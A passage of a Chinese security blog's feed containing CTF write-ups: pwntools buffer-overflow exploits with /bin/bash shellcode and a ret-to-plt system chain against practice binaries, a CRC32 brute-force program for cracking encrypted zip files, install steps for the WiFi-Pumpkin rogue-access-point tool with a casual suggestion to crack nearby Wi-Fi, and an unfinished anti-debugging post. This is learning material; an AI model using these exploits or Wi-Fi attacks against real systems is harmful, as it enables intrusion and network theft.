*</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">payload = shellcode+<span class="string">'a'</span>*(<span class="number">127</span>-len(shellcode))+p32(<span class="number">127</span>)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>方法二<br>1、存在jmp esp指令<br>2、栈溢出到jmp esp位置，执行shellcode<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">jmp_esp=<span class="number">0x8048500</span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(jmp_esp)+shellcode</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="4、babypwn4"><a href="#4、babypwn4" class="headerlink" title="4、babypwn4"></a>4、babypwn4</h2><p>分析程序，检查发现程序只有NX保护<br>潘师傅说这道题出题有点失误，但是还是很基础的，这里我就把我当poc.py献给大家<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn4'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn4'</span>)</div><div class="line">bss=elf.bss()</div><div class="line">read_plt=elf.plt[<span class="string">'read'</span>]</div><div class="line">system_plt=elf.plt[<span class="string">'system'</span>]</div><div class="line">pppr=<span class="number">0x8048639</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">245</span> +p32(read_plt)+p32(pppr)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)+p32(system_plt)+p32(<span class="number">1</span>)+p32(bss)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>这里我要睡觉了，就不解释了。有任何问题欢迎来问</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;潘师傅不想写这么简单的wp,我就来写了。潘师傅讲了pwn的入门，我也听了，虽然以前也学过一下，不过今天收获也挺多的。这里把潘师傅布置的题目记录一下。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>给你压缩包却又不给你密码的人在想什么</title>
    <link href="http://yoursite.com/2017/11/11/misc_crc/"/>
    <id>http://yoursite.com/2017/11/11/misc_crc/</id>
    <published>2017-11-11T08:55:50.864Z</published>
    <updated>2017-11-13T05:46:43.520Z</updated>
    
    <content type="html"><![CDATA[<p>当然是有秘密不能给汝看<br><a id="more"></a></p><h2 id="1、rar加密压缩包"><a href="#1、rar加密压缩包" class="headerlink" title="1、rar加密压缩包"></a>1、rar加密压缩包</h2><h3 id="1、爆破"><a href="#1、爆破" class="headerlink" title="1、爆破"></a>1、爆破</h3><p>直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。</p><h3 id="2、CRC明文攻击"><a href="#2、CRC明文攻击" class="headerlink" title="2、CRC明文攻击"></a>2、CRC明文攻击</h3><p>这里和zip文明攻击一样的，代码在zip明文攻击那里。</p><h2 id="2、zip加密压缩包"><a href="#2、zip加密压缩包" class="headerlink" title="2、zip加密压缩包"></a>2、zip加密压缩包</h2><h2 id="1、看看是不是伪加密"><a href="#1、看看是不是伪加密" class="headerlink" title="1、看看是不是伪加密"></a>1、看看是不是伪加密</h2><p>010打开zip压缩包，伪加密的<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgeh39gakj311s0iewiz.jpg" alt=""><br>修改为正常的<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgej1amtmj311k0hf78k.jpg" alt=""><br>可以打开了</p><p>kali也可以直接提取zip伪加密？？？</p><h3 id="1、爆破-1"><a href="#1、爆破-1" class="headerlink" title="1、爆破"></a>1、爆破</h3><p>直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。</p><h3 id="2、CRC明文攻击-1"><a href="#2、CRC明文攻击-1" class="headerlink" title="2、CRC明文攻击"></a>2、CRC明文攻击</h3><p>如果是这样的,就可以啦<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgeoti8shj311z0lj0wv.jpg" alt=""><br>取出zip中的CRC<br>python代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zipfile, os</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">c=[]</div><div class="line">rootname = <span class="string">'misc_big_zip.zip'</span>;</div><div class="line">r = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@"</span>;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">41</span>):</div><div class="line">    <span class="keyword">if</span> i &lt; <span class="number">10</span>:</div><div class="line">        t = <span class="string">"0"</span> + str(i)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        t = str(i)</div><div class="line">    name = <span class="string">"small_"</span> + t + <span class="string">".txt"</span>;</div><div class="line">    <span class="keyword">print</span> name;</div><div class="line">    zipFile = zipfile.ZipFile(os.path.join(os.getcwd(), rootname));</div><div class="line">    zipinfo = zipFile.getinfo(name);</div><div class="line">    crcs = zipinfo.CRC;</div><div class="line">    c.append(crcs)</div><div class="line"><span class="keyword">print</span> c</div></pre></td></tr></table></figure></p><p>C语言CRC代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">Crc32_ComputeBuf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> bufLen)</span> </span>&#123;</div><div class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> crcTable[<span class="number">256</span>] = &#123;</div><div class="line"><span class="number">0x00000000</span>,<span class="number">0x77073096</span>,<span class="number">0xEE0E612C</span>,<span class="number">0x990951BA</span>,<span class="number">0x076DC419</span>,<span class="number">0x706AF48F</span>,<span class="number">0xE963A535</span>,</div><div class="line"><span class="number">0x9E6495A3</span>,<span class="number">0x0EDB8832</span>,<span class="number">0x79DCB8A4</span>,<span class="number">0xE0D5E91E</span>,<span class="number">0x97D2D988</span>,<span class="number">0x09B64C2B</span>,<span class="number">0x7EB17CBD</span>,</div><div class="line"><span class="number">0xE7B82D07</span>,<span class="number">0x90BF1D91</span>,<span class="number">0x1DB71064</span>,<span class="number">0x6AB020F2</span>,<span class="number">0xF3B97148</span>,<span class="number">0x84BE41DE</span>,<span class="number">0x1ADAD47D</span>,</div><div class="line"><span class="number">0x6DDDE4EB</span>,<span class="number">0xF4D4B551</span>,<span class="number">0x83D385C7</span>,<span class="number">0x136C9856</span>,<span class="number">0x646BA8C0</span>,<span class="number">0xFD62F97A</span>,<span class="number">0x8A65C9EC</span>,</div><div class="line"><span class="number">0x14015C4F</span>,<span class="number">0x63066CD9</span>,<span class="number">0xFA0F3D63</span>,<span class="number">0x8D080DF5</span>,<span class="number">0x3B6E20C8</span>,<span class="number">0x4C69105E</span>,<span class="number">0xD56041E4</span>,</div><div class="line"><span class="number">0xA2677172</span>,<span class="number">0x3C03E4D1</span>,<span class="number">0x4B04D447</span>,<span class="number">0xD20D85FD</span>,<span class="number">0xA50AB56B</span>,<span class="number">0x35B5A8FA</span>,<span class="number">0x42B2986C</span>,</div><div class="line"><span class="number">0xDBBBC9D6</span>,<span class="number">0xACBCF940</span>,<span class="number">0x32D86CE3</span>,<span class="number">0x45DF5C75</span>,<span class="number">0xDCD60DCF</span>,<span class="number">0xABD13D59</span>,<span class="number">0x26D930AC</span>,</div><div class="line"><span class="number">0x51DE003A</span>,<span class="number">0xC8D75180</span>,<span class="number">0xBFD06116</span>,<span class="number">0x21B4F4B5</span>,<span class="number">0x56B3C423</span>,<span class="number">0xCFBA9599</span>,<span class="number">0xB8BDA50F</span>,</div><div class="line"><span class="number">0x2802B89E</span>,<span class="number">0x5F058808</span>,<span class="number">0xC60CD9B2</span>,<span class="number">0xB10BE924</span>,<span class="number">0x2F6F7C87</span>,<span class="number">0x58684C11</span>,<span class="number">0xC1611DAB</span>,</div><div class="line"><span class="number">0xB6662D3D</span>,<span class="number">0x76DC4190</span>,<span class="number">0x01DB7106</span>,<span class="number">0x98D220BC</span>,<span class="number">0xEFD5102A</span>,<span class="number">0x71B18589</span>,<span class="number">0x06B6B51F</span>,</div><div class="line"><span class="number">0x9FBFE4A5</span>,<span class="number">0xE8B8D433</span>,<span class="number">0x7807C9A2</span>,<span class="number">0x0F00F934</span>,<span class="number">0x9609A88E</span>,<span class="number">0xE10E9818</span>,<span class="number">0x7F6A0DBB</span>,</div><div class="line"><span class="number">0x086D3D2D</span>,<span class="number">0x91646C97</span>,<span class="number">0xE6635C01</span>,<span class="number">0x6B6B51F4</span>,<span class="number">0x1C6C6162</span>,<span class="number">0x856530D8</span>,<span class="number">0xF262004E</span>,</div><div class="line"><span class="number">0x6C0695ED</span>,<span class="number">0x1B01A57B</span>,<span class="number">0x8208F4C1</span>,<span class="number">0xF50FC457</span>,<span class="number">0x65B0D9C6</span>,<span class="number">0x12B7E950</span>,<span class="number">0x8BBEB8EA</span>,</div><div class="line"><span class="number">0xFCB9887C</span>,<span class="number">0x62DD1DDF</span>,<span class="number">0x15DA2D49</span>,<span class="number">0x8CD37CF3</span>,<span class="number">0xFBD44C65</span>,<span class="number">0x4DB26158</span>,<span class="number">0x3AB551CE</span>,</div><div class="line"><span class="number">0xA3BC0074</span>,<span class="number">0xD4BB30E2</span>,<span class="number">0x4ADFA541</span>,<span class="number">0x3DD895D7</span>,<span class="number">0xA4D1C46D</span>,<span class="number">0xD3D6F4FB</span>,<span class="number">0x4369E96A</span>,</div><div class="line"><span class="number">0x346ED9FC</span>,<span class="number">0xAD678846</span>,<span class="number">0xDA60B8D0</span>,<span class="number">0x44042D73</span>,<span class="number">0x33031DE5</span>,<span class="number">0xAA0A4C5F</span>,<span class="number">0xDD0D7CC9</span>,</div><div class="line"><span class="number">0x5005713C</span>,<span class="number">0x270241AA</span>,<span class="number">0xBE0B1010</span>,<span class="number">0xC90C2086</span>,<span class="number">0x5768B525</span>,<span class="number">0x206F85B3</span>,<span class="number">0xB966D409</span>,</div><div class="line"><span class="number">0xCE61E49F</span>,<span class="number">0x5EDEF90E</span>,<span class="number">0x29D9C998</span>,<span class="number">0xB0D09822</span>,<span class="number">0xC7D7A8B4</span>,<span class="number">0x59B33D17</span>,<span class="number">0x2EB40D81</span>,</div><div class="line"><span class="number">0xB7BD5C3B</span>,<span class="number">0xC0BA6CAD</span>,<span class="number">0xEDB88320</span>,<span class="number">0x9ABFB3B6</span>,<span class="number">0x03B6E20C</span>,<span class="number">0x74B1D29A</span>,<span class="number">0xEAD54739</span>,</div><div class="line"><span class="number">0x9DD277AF</span>,<span class="number">0x04DB2615</span>,<span class="number">0x73DC1683</span>,<span class="number">0xE3630B12</span>,<span class="number">0x94643B84</span>,<span class="number">0x0D6D6A3E</span>,<span class="number">0x7A6A5AA8</span>,</div><div class="line"><span class="number">0xE40ECF0B</span>,<span class="number">0x9309FF9D</span>,<span class="number">0x0A00AE27</span>,<span class="number">0x7D079EB1</span>,<span class="number">0xF00F9344</span>,<span class="number">0x8708A3D2</span>,<span class="number">0x1E01F268</span>,</div><div class="line"><span class="number">0x6906C2FE</span>,<span class="number">0xF762575D</span>,<span class="number">0x806567CB</span>,<span class="number">0x196C3671</span>,<span class="number">0x6E6B06E7</span>,<span class="number">0xFED41B76</span>,<span class="number">0x89D32BE0</span>,</div><div class="line"><span class="number">0x10DA7A5A</span>,<span class="number">0x67DD4ACC</span>,<span class="number">0xF9B9DF6F</span>,<span class="number">0x8EBEEFF9</span>,<span class="number">0x17B7BE43</span>,<span class="number">0x60B08ED5</span>,<span class="number">0xD6D6A3E8</span>,</div><div class="line"><span class="number">0xA1D1937E</span>,<span class="number">0x38D8C2C4</span>,<span class="number">0x4FDFF252</span>,<span class="number">0xD1BB67F1</span>,<span class="number">0xA6BC5767</span>,<span class="number">0x3FB506DD</span>,<span class="number">0x48B2364B</span>,</div><div class="line"><span class="number">0xD80D2BDA</span>,<span class="number">0xAF0A1B4C</span>,<span class="number">0x36034AF6</span>,<span class="number">0x41047A60</span>,<span class="number">0xDF60EFC3</span>,<span class="number">0xA867DF55</span>,<span class="number">0x316E8EEF</span>,</div><div class="line"><span class="number">0x4669BE79</span>,<span class="number">0xCB61B38C</span>,<span class="number">0xBC66831A</span>,<span class="number">0x256FD2A0</span>,<span class="number">0x5268E236</span>,<span class="number">0xCC0C7795</span>,<span class="number">0xBB0B4703</span>,</div><div class="line"><span class="number">0x220216B9</span>,<span class="number">0x5505262F</span>,<span class="number">0xC5BA3BBE</span>,<span class="number">0xB2BD0B28</span>,<span class="number">0x2BB45A92</span>,<span class="number">0x5CB36A04</span>,<span class="number">0xC2D7FFA7</span>,</div><div class="line"><span class="number">0xB5D0CF31</span>,<span class="number">0x2CD99E8B</span>,<span class="number">0x5BDEAE1D</span>,<span class="number">0x9B64C2B0</span>,<span class="number">0xEC63F226</span>,<span class="number">0x756AA39C</span>,<span class="number">0x026D930A</span>,</div><div class="line"><span class="number">0x9C0906A9</span>,<span class="number">0xEB0E363F</span>,<span class="number">0x72076785</span>,<span class="number">0x05005713</span>,<span class="number">0x95BF4A82</span>,<span class="number">0xE2B87A14</span>,<span class="number">0x7BB12BAE</span>,</div><div class="line"><span class="number">0x0CB61B38</span>,<span class="number">0x92D28E9B</span>,<span class="number">0xE5D5BE0D</span>,<span class="number">0x7CDCEFB7</span>,<span class="number">0x0BDBDF21</span>,<span class="number">0x86D3D2D4</span>,<span class="number">0xF1D4E242</span>,</div><div class="line"><span class="number">0x68DDB3F8</span>,<span class="number">0x1FDA836E</span>,<span class="number">0x81BE16CD</span>,<span class="number">0xF6B9265B</span>,<span class="number">0x6FB077E1</span>,<span class="number">0x18B74777</span>,<span class="number">0x88085AE6</span>,</div><div class="line"><span class="number">0xFF0F6A70</span>,<span class="number">0x66063BCA</span>,<span class="number">0x11010B5C</span>,<span class="number">0x8F659EFF</span>,<span class="number">0xF862AE69</span>,<span class="number">0x616BFFD3</span>,<span class="number">0x166CCF45</span>,</div><div class="line"><span class="number">0xA00AE278</span>,<span class="number">0xD70DD2EE</span>,<span class="number">0x4E048354</span>,<span class="number">0x3903B3C2</span>,<span class="number">0xA7672661</span>,<span class="number">0xD06016F7</span>,<span class="number">0x4969474D</span>,</div><div class="line"><span class="number">0x3E6E77DB</span>,<span class="number">0xAED16A4A</span>,<span class="number">0xD9D65ADC</span>,<span class="number">0x40DF0B66</span>,<span class="number">0x37D83BF0</span>,<span class="number">0xA9BCAE53</span>,<span class="number">0xDEBB9EC5</span>,</div><div class="line"><span class="number">0x47B2CF7F</span>,<span class="number">0x30B5FFE9</span>,<span class="number">0xBDBDF21C</span>,<span class="number">0xCABAC28A</span>,<span class="number">0x53B39330</span>,<span class="number">0x24B4A3A6</span>,<span class="number">0xBAD03605</span>,</div><div class="line"><span class="number">0xCDD70693</span>,<span class="number">0x54DE5729</span>,<span class="number">0x23D967BF</span>,<span class="number">0xB3667A2E</span>,<span class="number">0xC4614AB8</span>,<span class="number">0x5D681B02</span>,<span class="number">0x2A6F2B94</span>,</div><div class="line"><span class="number">0xB40BBE37</span>,<span class="number">0xC30C8EA1</span>,<span class="number">0x5A05DF1B</span>,<span class="number">0x2D02EF8D</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> crc32 = <span class="number">0xFFFFFFFF</span>;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *byteBuf;</div><div class="line"><span class="keyword">size_t</span> i;</div><div class="line"></div><div class="line">byteBuf = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)buf;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; bufLen; i++) &#123;</div><div class="line">crc32 = (crc32 &gt;&gt; <span class="number">8</span>) ^ crcTable[(crc32 ^ byteBuf[i]) &amp; <span class="number">0xFF</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> crc32 ^ <span class="number">0xFFFFFFFF</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> *charSet = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@\n "</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> crc32[] = &#123; <span class="number">1606238046</span>, <span class="number">1943531056</span>, <span class="number">3598719407L</span>, <span class="number">2578797435L</span>, <span class="number">1405086858</span>, <span class="number">2143805016</span>, <span class="number">3234701029L</span>, <span class="number">3224637410L</span>, </div><div class="line"><span class="number">2346013297L</span>, <span class="number">1146766327</span>, <span class="number">4038678768L</span>, <span class="number">3119445409L</span>, <span class="number">2111148220</span>, <span class="number">383413051</span>, <span class="number">2853461348L</span>, <span class="number">3176759361L</span>, <span class="number">1852520927</span>, </div><div class="line"><span class="number">3083243303L</span>, <span class="number">2151747034L</span>, <span class="number">1392140456</span>, <span class="number">544449252</span>, <span class="number">1871340857</span>, <span class="number">574988077</span>, <span class="number">3459049483L</span>, <span class="number">2786065872L</span>, <span class="number">3888485555L</span>, </div><div class="line"><span class="number">1716930793</span>, <span class="number">1933746678</span>, <span class="number">3178216769L</span>, <span class="number">3774357278L</span>, <span class="number">622718466</span>, <span class="number">1488109481</span>, <span class="number">525106857</span>, <span class="number">3123386181L</span>, <span class="number">3472027048L</span>, </div><div class="line"><span class="number">616379830</span>, <span class="number">3728848209L</span>, <span class="number">1358333123</span>, <span class="number">1852520927</span>, <span class="number">3096466191L</span>, <span class="number">622718466</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">char</span> tmp[<span class="number">6</span>] = <span class="string">""</span>;</div><div class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(charSet);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="keyword">sizeof</span>(crc32) / <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) - <span class="number">1</span>;h&gt;=<span class="number">0</span>; h--) &#123;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; len; a++) &#123;</div><div class="line">tmp[<span class="number">0</span>] = charSet[a];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; len; b++) &#123;</div><div class="line">tmp[<span class="number">1</span>] = charSet[b];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; len; c++) &#123;</div><div class="line">tmp[<span class="number">2</span>] = charSet[c];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">0</span>; d &lt; len; d++) &#123;</div><div class="line">tmp[<span class="number">3</span>] = charSet[d];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> e = <span class="number">0</span>; e &lt; len; e++) &#123;</div><div class="line">tmp[<span class="number">4</span>] = charSet[e];</div><div class="line"><span class="keyword">if</span> (Crc32_ComputeBuf(tmp, <span class="built_in">strlen</span>(tmp)) == crc32[h]) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, tmp);</div><div class="line"><span class="comment">//goto label;//若是存在碰撞，那么这里可以将这里注释掉</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">label :;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>得到明文，要看看是什么压缩算法的，只有压缩算法相同，才能用已知明文攻击。查看加密算法，建议用7z查看，将得到的明文加密，在与需要解密的压缩包做比较，这样算法一样的，就可以用已知明文攻击<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flgecoxxaej31100nwq6m.jpg" alt=""><br>可以用ARCHPR和AZPR这里贴个链接吧<br><a href="https://jingyan.baidu.com/article/3052f5a1f62d6597f31f861c.html" target="_blank" rel="external">https://jingyan.baidu.com/article/3052f5a1f62d6597f31f861c.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当然是有秘密不能给汝看&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hexo安装配置</title>
    <link href="http://yoursite.com/2017/11/09/misc_hexo/"/>
    <id>http://yoursite.com/2017/11/09/misc_hexo/</id>
    <published>2017-11-09T11:31:23.091Z</published>
    <updated>2017-11-09T11:38:13.078Z</updated>
    
    <content type="html"><![CDATA[<p>颜值即正义<br><a id="more"></a></p><h2 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h2><p><a href="http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more" target="_blank" rel="external">http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more</a></p><h2 id="2、换主题"><a href="#2、换主题" class="headerlink" title="2、换主题"></a>2、换主题</h2><p><a href="http://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" rel="external">http://blog.csdn.net/qq_33699981/article/details/72716951</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;颜值即正义&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WIFI破解密码</title>
    <link href="http://yoursite.com/2017/11/09/misc_wifi/"/>
    <id>http://yoursite.com/2017/11/09/misc_wifi/</id>
    <published>2017-11-09T06:32:11.621Z</published>
    <updated>2017-11-10T01:20:14.655Z</updated>
    
    <content type="html"><![CDATA[<p>到处都是wifi，那就破解吧，贼好用<br><a id="more"></a></p><h2 id="1、WIFI破解密码"><a href="#1、WIFI破解密码" class="headerlink" title="1、WIFI破解密码"></a>1、WIFI破解密码</h2><h2 id="2、钓鱼WiFi"><a href="#2、钓鱼WiFi" class="headerlink" title="2、钓鱼WiFi"></a>2、钓鱼WiFi</h2><p>需要安装 Pyqt4<br>安装类库<br><code>pip install -r requirements.txt</code><br>安装:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git</div><div class="line">cd WiFi-Pumpkin</div><div class="line">chmod +x installer.sh</div><div class="line">./installer.sh --install</div></pre></td></tr></table></figure></p><p>安装成功<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flbtpq4f9bj30r50h8dho.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;到处都是wifi，那就破解吧，贼好用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——反调试</title>
    <link href="http://yoursite.com/2017/11/08/re_kx3/"/>
    <id>http://yoursite.com/2017/11/08/re_kx3/</id>
    <published>2017-11-08T09:21:27.043Z</published>
    <updated>2017-11-09T12:46:38.589Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、OD附加，过反调试<br>先运行exe程序，再打开od附加exe进程，再调用GetWindowTextW的API时候下断点，点击运行，exe程序输入sn,此时会断在od中的GetWindowTextW的断点（还在api系统区）<br><img src="" alt=""><br>往下走来到程序区<br><img src="" alt=""><br>往下走,主要细节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div 